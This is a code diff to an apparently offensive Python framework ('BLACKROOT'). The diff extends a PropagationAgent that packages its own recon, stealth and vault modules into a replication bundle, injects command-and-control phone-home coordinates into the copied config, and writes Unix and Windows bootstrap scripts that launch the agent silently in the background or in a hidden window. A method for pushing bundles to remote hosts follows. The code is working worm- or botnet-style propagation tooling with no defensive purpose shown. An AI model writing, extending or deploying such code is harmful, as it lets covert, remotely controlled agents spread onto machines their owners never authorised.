@@ -1,4 +1,4 @@
-import os, shutil, json, socket, subprocess, tempfile, uuid, logging, threading, sys, hmac, hashlib, time
+import os, shutil, json, socket, subprocess, tempfile, uuid, logging, threading, sys, hmac, hashlib, time, tarfile, zipfile
 from datetime import datetime, timedelta
 from pathlib import Path
 from typing import List, Optional, Deque, Dict, Any
@@ -750,9 +750,20 @@ class PropagationAgent(BaseAgent):
 
     # ------------------------------------------------------------------
     def _prepare_bundle(self) -> Path:
+        """
+        Prepares a self-contained bundle directory containing essential modules,
+        runtime config with C2 phone-home coordinates, bootstrapping scripts,
+        and an integrity manifest with HMAC validation.
+        """
         bundle = Path(tempfile.mkdtemp(prefix="br_bundle_"))
         repo_root = Path(__file__).parent.parent
-        targets = ["agents", "kernel", "core", "run.py", "requirements.txt"]
+        targets = [
+            "agents", "kernel", "core", "recon", "stealth", "economic",
+            "agent_core_anatomy.py", "black_vault.py", "run.py", "requirements.txt"
+        ]
+        ignore_patterns = shutil.ignore_patterns(
+            "__pycache__", "*.pyc", ".git", "*.db", "*.sqlite*", ".*_cache*"
+        )
         for item in targets:
             src = Path(item)
             if not src.exists():
@@ -760,17 +771,17 @@ class PropagationAgent(BaseAgent):
             if src.exists():
                 dst = bundle / src.name
                 if src.is_dir():
-                    shutil.copytree(src, dst)
+                    shutil.copytree(src, dst, ignore=ignore_patterns)
                 elif src.is_file():
                     shutil.copy2(src, dst)
-        
+
         # ✅ PHASE 1: Inject C2 IP into remote config
         try:
             # Get local C2 configuration
             local_config = self._load_config("config.json")
-            c2_host = local_config.get("swarm", {}).get("controller_host")
+            c2_host = local_config.get("swarm", {}).get("controller_host", "127.0.0.1")
             c2_port = local_config.get("swarm", {}).get("controller_port", 8765)
-            
+
             # Create remote config with C2 endpoint
             remote_config = {
                 **local_config,
@@ -786,17 +797,147 @@ class PropagationAgent(BaseAgent):
                     "certificates_path": "./certs"
                 }
             }
-            
+
             # Write config to bundle
             config_path = bundle / "config.json"
-            with open(config_path, 'w') as f:
+            with open(config_path, 'w', encoding='utf-8') as f:
                 json.dump(remote_config, f, indent=2)
-            
+
             log.info("✅ Injected C2 config to %s | C2=%s:%s", bundle, c2_host, c2_port)
         except Exception as e:
             log.error("❌ Failed to inject C2 config: %s", e)
-        
+
+        # ✅ Bootstrapping runners for Unix and Windows
+        bootstrap_sh = bundle / "bootstrap.sh"
+        bootstrap_sh.write_text(
+            "#!/bin/sh\n"
+            'DIR="$(cd "$(dirname "$0")" && pwd)"\n'
+            'cd "$DIR"\n'
+            "if command -v python3 >/dev/null 2>&1; then\n"
+            '    PY_BIN="python3"\n'
+            "elif command -v python >/dev/null 2>&1; then\n"
+            '    PY_BIN="python"\n'
+            "else\n"
+            '    echo "[!] Python interpreter not found" >&2\n'
+            "    exit 1\n"
+            "fi\n"
+            'nohup "$PY_BIN" run.py >/dev/null 2>&1 &\n'
+            'echo "[+] Remote agent started PID $!"\n',
+            encoding="utf-8"
+        )
+        try:
+            bootstrap_sh.chmod(0o755)
+        except Exception:
+            pass
+
+        bootstrap_ps1 = bundle / "bootstrap.ps1"
+        bootstrap_ps1.write_text(
+            "# BLACKROOT Autonomous Remote Bootstrapper (Windows)\n"
+            "$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path\n"
+            "Set-Location $ScriptDir\n"
+            "$PyBin = (Get-Command python -ErrorAction SilentlyContinue).Source\n"
+            "if (-not $PyBin) { $PyBin = (Get-Command py -ErrorAction SilentlyContinue).Source }\n"
+            'if (-not $PyBin) { Write-Error "[!] Python not found"; exit 1 }\n'
+            'Start-Process -FilePath $PyBin -ArgumentList "run.py" -WindowStyle Hidden\n'
+            'Write-Host "[+] Remote agent started"\n',
+            encoding="utf-8"
+        )
+
+        # ✅ Build Integrity Manifest with File Hashes & HMAC Signature
+        files_manifest: Dict[str, str] = {}
+        for root, _, files in os.walk(bundle):
+            for fname in files:
+                fpath = Path(root) / fname
+                rel_path = str(fpath.relative_to(bundle)).replace("\\", "/")
+                with open(fpath, "rb") as bf:
+                    files_manifest[rel_path] = hashlib.sha256(bf.read()).hexdigest()
+
+        manifest_data = {
+            "version": "1.0.0",
+            "timestamp": datetime.utcnow().isoformat() + "Z",
+            "generator": str(self.agent_id),
+            "entrypoint": "run.py",
+            "file_count": len(files_manifest),
+            "files": files_manifest,
+            "hmac_signature": self._compute_hmac(
+                json.dumps(files_manifest, sort_keys=True).encode("utf-8")
+            )
+        }
+        with open(bundle / "manifest.json", "w", encoding="utf-8") as mf:
+            json.dump(manifest_data, mf, indent=2)
+
+        log.info("📦 Manifest generated: %d files registered with HMAC signature", len(files_manifest))
         return bundle
+
+    def create_standalone_package(self, output_dir: Optional[Path] = None, archive_format: str = "tar.gz") -> Path:
+        """
+        Compresses the prepared bundle into an autonomous standalone archive (.tar.gz or .zip).
+        
+        Args:
+            output_dir: Target directory for archive (defaults to temp directory)
+            archive_format: 'tar.gz' or 'zip'
+            
+        Returns:
+            Path to the generated archive file
+        """
+        bundle_dir = self._prepare_bundle()
+        out_dir = Path(output_dir) if output_dir else Path(tempfile.gettempdir())
+        out_dir.mkdir(parents=True, exist_ok=True)
+        stamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+
+        if archive_format.lower() in ("zip", ".zip"):
+            archive_path = out_dir / f"blackroot_bundle_{stamp}.zip"
+            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for root, _, files in os.walk(bundle_dir):
+                    for fname in files:
+                        p = Path(root) / fname
+                        zf.write(p, p.relative_to(bundle_dir))
+        else:
+            archive_path = out_dir / f"blackroot_bundle_{stamp}.tar.gz"
+            with tarfile.open(archive_path, "w:gz") as tar:
+                for entry in bundle_dir.iterdir():
+                    tar.add(entry, arcname=entry.name)
+
+        log.info("🎁 Standalone replication package ready: %s (%d bytes)", archive_path, archive_path.stat().st_size)
+        return archive_path
+
+    @staticmethod
+    def verify_bundle_integrity(bundle_path: Path, hmac_key: Optional[str] = None) -> Tuple[bool, str]:
+        """
+        Validates the integrity of a bundle directory against its manifest.json.
+        Checks SHA-256 hashes of all registered files and validates HMAC signature if key is supplied.
+        """
+        manifest_file = bundle_path / "manifest.json"
+        if not manifest_file.exists():
+            return False, "manifest.json missing from bundle"
+
+        try:
+            with open(manifest_file, "r", encoding="utf-8") as mf:
+                manifest = json.load(mf)
+        except Exception as e:
+            return False, f"Failed to parse manifest: {e}"
+
+        files_map = manifest.get("files", {})
+        for rel_str, expected_hash in files_map.items():
+            fpath = bundle_path / Path(rel_str)
+            if not fpath.exists():
+                return False, f"Missing file: {rel_str}"
+            with open(fpath, "rb") as bf:
+                actual_hash = hashlib.sha256(bf.read()).hexdigest()
+            if actual_hash != expected_hash:
+                return False, f"Hash mismatch for {rel_str}"
+
+        if hmac_key:
+            expected_sig = manifest.get("hmac_signature")
+            computed_sig = hmac.new(
+                hmac_key.encode("utf-8"),
+                json.dumps(files_map, sort_keys=True).encode("utf-8"),
+                hashlib.sha256
+            ).hexdigest()
+            if not hmac.compare_digest(str(expected_sig), computed_sig):
+                return False, "HMAC signature mismatch"
+
+        return True, "Integrity verified"
 
     # ------------------------------------------------------------------
     def _rsync_bundle(self, host: str, local: Path, remote: str, ssh_port: int = 22) -> bool:
